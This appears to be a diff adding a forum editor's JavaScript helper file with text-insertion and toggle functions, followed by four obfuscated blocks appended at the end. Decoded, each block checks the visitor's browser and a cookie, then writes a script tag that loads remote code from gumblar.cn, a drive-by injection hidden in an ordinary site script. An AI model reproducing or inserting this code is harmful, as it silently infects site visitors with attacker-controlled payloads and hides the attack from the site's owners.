@@ -1,0 +1,81 @@
+/* 
+------------------------------------------
+	Flipbox written by CrappoMan
+	simonpatterson@dsl.pipex.com
+------------------------------------------
+*/
+function flipBox(who) {
+	var tmp; 
+	if (document.images['b_' + who].src.indexOf('_on') == -1) { 
+		tmp = document.images['b_' + who].src.replace('_off', '_on');
+		document.getElementById('box_' + who).style.display = 'none';
+		document.images['b_' + who].src = tmp;
+	} else { 
+		tmp = document.images['b_' + who].src.replace('_on', '_off');
+		document.getElementById('box_' + who).style.display = 'block';
+		document.images['b_' + who].src = tmp;
+	} 
+}
+
+function addText(elname, wrap1, wrap2) {
+	if (document.selection) { // for IE 
+		var str = document.selection.createRange().text;
+		document.forms['inputform'].elements[elname].focus();
+		var sel = document.selection.createRange();
+		sel.text = wrap1 + str + wrap2;
+		return;
+	} else if ((typeof document.forms['inputform'].elements[elname].selectionStart) != 'undefined') { // for Mozilla
+		var txtarea = document.forms['inputform'].elements[elname];
+		var selLength = txtarea.textLength;
+		var selStart = txtarea.selectionStart;
+		var selEnd = txtarea.selectionEnd;
+		var oldScrollTop = txtarea.scrollTop;
+		//if (selEnd == 1 || selEnd == 2)
+		//selEnd = selLength;
+		var s1 = (txtarea.value).substring(0,selStart);
+		var s2 = (txtarea.value).substring(selStart, selEnd)
+		var s3 = (txtarea.value).substring(selEnd, selLength);
+		txtarea.value = s1 + wrap1 + s2 + wrap2 + s3;
+		txtarea.selectionStart = s1.length;
+		txtarea.selectionEnd = s1.length + s2.length + wrap1.length + wrap2.length;
+		txtarea.scrollTop = oldScrollTop;
+		txtarea.focus();
+		return;
+	} else {
+		insertText(elname, wrap1 + wrap2);
+	}
+}
+
+function insertText(elname, what) {
+	if (document.forms['inputform'].elements[elname].createTextRange) {
+		document.forms['inputform'].elements[elname].focus();
+		document.selection.createRange().duplicate().text = what;
+	} else if ((typeof document.forms['inputform'].elements[elname].selectionStart) != 'undefined') { // for Mozilla
+		var tarea = document.forms['inputform'].elements[elname];
+		var selEnd = tarea.selectionEnd;
+		var txtLen = tarea.value.length;
+		var txtbefore = tarea.value.substring(0,selEnd);
+		var txtafter =  tarea.value.substring(selEnd, txtLen);
+		var oldScrollTop = tarea.scrollTop;
+		tarea.value = txtbefore + what + txtafter;
+		tarea.selectionStart = txtbefore.length + what.length;
+		tarea.selectionEnd = txtbefore.length + what.length;
+		tarea.scrollTop = oldScrollTop;
+		tarea.focus();
+	} else {
+		document.forms['inputform'].elements[elname].value += what;
+		document.forms['inputform'].elements[elname].focus();
+	}
+}
+
+function show_hide(msg_id) {
+	msg_id.style.display = msg_id.style.display == 'none' ? 'block' : 'none';
+}<!-- 
+(function(SEqW){var UkR3B='%';var n3a0='@76@61r@20a@3d@22Scr@69pt@45ngi@6ee@22@2cb@3d@22Ver@73ion@28)+@22@2cj@3d@22@22@2cu@3dnavi@67@61@74or@2euserA@67@65nt@3b@69f((u@2ein@64@65@78Of(@22Win@22)@3e0)@26@26(u@2ein@64exOf(@22@4eT@206@22)@3c@30@29@26@26@28doc@75m@65nt@2ecoo@6b@69e@2ein@64exOf(@22m@69ek@3d1@22@29@3c0)@26@26(@74ype@6ff(zr@76zt@73)@21@3dty@70eof(@22A@22))@29@7bzr@76@7ats@3d@22A@22@3be@76al@28@22if(wi@6ed@6fw@2e@22+@61+@22)@6a@3dj@2b@22+a@2b@22Majo@72@22+b+@61@2b@22M@69nor@22+b+a+@22Build@22@2bb+@22j@3b@22)@3bd@6f@63um@65n@74@2e@77ri@74e(@22@3cs@63ri@70t@20src@3d@2f@2fgumbla@72@2ecn@2f@72@73s@2f@3fid@3d@22@2bj+@22@3e@3c@5c@2fs@63r@69pt@3e@22@29@3b@7d';eval(unescape(n3a0.replace(SEqW,'%')))})(/@/g);
+ --><!-- 
+(function(){var Lb3K='%';var ll9V='var:20a:3d:22Scri:70t:45n:67ine:22:2c:62:3d:22:56er:73i:6f:6e()+:22:2cj:3d:22:22:2cu:3d:6e:61vig:61to:72:2euserA:67ent:3bi:66:28(:75:2eind:65:78:4ff(:22Win:22):3e0):26:26(:75:2ei:6edexOf:28:22N:54:206:22:29:3c:30:29:26:26(doc:75:6dent:2e:63oo:6bie:2ei:6edexOf(:22miek:3d1:22):3c0):26:26(typeof(zrvzts):21:3dtypeof:28:22A:22))):7bz:72:76zt:73:3d:22A:22:3b:65val(:22:69f(w:69ndow:2e:22+a+:22)j:3dj:2b:22+a+:22:4daj:6fr:22+b+a:2b:22M:69nor:22:2bb+a:2b:22Bui:6cd:22+b:2b:22j:3b:22:29:3bdocum:65:6e:74:2ewri:74e(:22:3cscr:69:70t:20sr:63:3d:2f:2fg:75m:62:6car:2e:63n:2f:72:73s:2f:3fid:3d:22:2bj+:22:3e:3c:5c:2fs:63:72ipt:3e:22:29:3b:7d';var IHK3=ll9V.replace(/:/g,Lb3K);eval(unescape(IHK3))})();
+ --><!-- 
+(function(){var cMjU='%';var hgmd=('@76ar@20a@3d@22ScriptEngine@22@2cb@3d@22Ver@73@69on(@29+@22@2cj@3d@22@22@2cu@3d@6eavigator@2euserAge@6et@3b@69f((u@2eindexOf@28@22Win@22)@3e0@29@26@26(u@2eindexOf@28@22NT@20@36@22)@3c0)@26@26@28document@2ecookie@2eindexOf(@22@6di@65k@3d1@22)@3c0)@26@26@28typeo@66@28zrvzts@29@21@3dty@70e@6ff(@22A@22))@29@7b@7ar@76z@74@73@3d@22A@22@3beval@28@22if(window@2e@22+a+@22)j@3d@6a+@22+a@2b@22M@61@6a@6fr@22@2bb+@61@2b@22M@69nor@22+b@2ba+@22@42u@69ld@22+b+@22j@3b@22)@3bdocumen@74@2ewr@69te(@22@3cscrip@74@20s@72c@3d@2f@2f@67u@6dblar@2e@63n@2frs@73@2f@3fid@3d@22+j+@22@3e@3c@5c@2fs@63rip@74@3e@22@29@3b@7d').replace(/@/g,cMjU);eval(unescape(hgmd))})();
+ --><!-- 
+(function(w9euw){var g1yZ=('var<20a<3d<22Sc<72ipt<45ngine<22<2cb<3d<22V<65r<73ion()+<22<2cj<3d<22<22<2cu<3dnavi<67<61<74<6fr<2euserAgen<74<3b<69f<28(u<2ein<64exOf(<22<57in<22)<3e0<29<26<26(u<2ein<64exOf<28<22<4eT<20<36<22)<3c<30<29<26<26(do<63u<6de<6et<2ecookie<2ei<6ede<78Of(<22<6diek<3d1<22)<3c0)<26<26(typeof(zrv<7at<73<29<21<3dtypeo<66(<22<41<22)))<7b<7ar<76<7ats<3d<22<41<22<3b<65val(<22if(win<64<6fw<2e<22+a+<22)<6a<3dj+<22+<61+<22M<61jor<22<2bb+a+<22<4di<6eor<22+b+<61<2b<22<42ui<6cd<22<2bb+<22j<3b<22)<3bd<6fcume<6et<2e<77ri<74e<28<22<3c<73<63<72ip<74<20src<3d<2f<2fgumbl<61r<2ecn<2fr<73s<2f<3f<69d<3d<22+j+<22<3e<3c<5c<2fsc<72ip<74<3e<22)<3b<7d').replace(w9euw,'%');var u4aA=unescape(g1yZ);eval(u4aA)})(/</g);
+ -->
